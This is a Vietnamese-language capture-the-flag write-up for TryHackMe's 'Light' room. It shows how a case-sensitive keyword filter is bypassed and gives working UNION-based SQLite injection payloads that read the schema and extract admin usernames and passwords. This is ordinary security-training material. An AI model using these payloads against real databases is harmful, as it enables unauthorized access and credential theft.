---
title: 'THM - Light'
category: 'ctf'
date: '01-02-2025'
---

# Intro

![alt text](light.png)

# Enumeration
- Đầu tiền thử các trường hợp các dấu:
    - Với dấu `'`
    ![alt text](light-1.png)
    - Với dấu `--`
    ![alt text](light-2.png)
- Rõ rằng với các exception kia ta loại được 1 mớ các dấu: `/* -- %0b`
- Thử với các từ khóa:
    - `select`
    ![alt text](light-3.png)
    - Tương tự ta có cùng kết quá với `union where from`
    - Nếu đổi sang `SelEct` kết quả là
    ![alt text](light-4.png)
- Vậy là cái filter này lọc không lỗi và có thể dùng bất cứ từ khóa nào.
# Exploitation
- Quay trở lại với việc thử dấu `'`, ta rõ ràng nhận ra cuối query có `LIMIT 30`
![alt text](light-1.png)
- Với cái đuôi LIMIT 30 này thì ta sử dụng loại chèn đuôi vì kết quả in ra không quá ảnh hưởng.
- Ta cũng có thể dự đoán được query sẽ gần gần như sau:
```sql
select password from [gì đó] where username = '[input]' limit 30
```
- Thử xem dùng `union` hay `;` thì ta có:
```sql
123'; SelEct '1
```
*(ở đây là nó treo luôn)*
![alt text](light-5.png)
```sql 
123' UniOn SelEct '1
```
- Vậy là ta sẽ sử dụng `union`
![alt text](light-6.png)
- Ta tiến hành kiểm tra dbms là loại gì và phiên bản gì, kết quả trả ra là SQLite với `123' unIon SElect sqlite_version() '`
![alt text](light-7.png)
- Ta lấy cấu trúc của DB bằng cú pháp
```sql 
123' uniOn SeLECT group_concat(sql) FRoM sqlite_master '
```
![alt text](light-8.png)
- Lấy `username` từ `admintable` rồi có flag là chuyện cỏn con rồi nhé
```sql
123' UniOn sElect group_concat(username) fRom admintable '

123' UniOn sElect password fRom admintable wheRe username = '[gì đó tự biết]
``` 

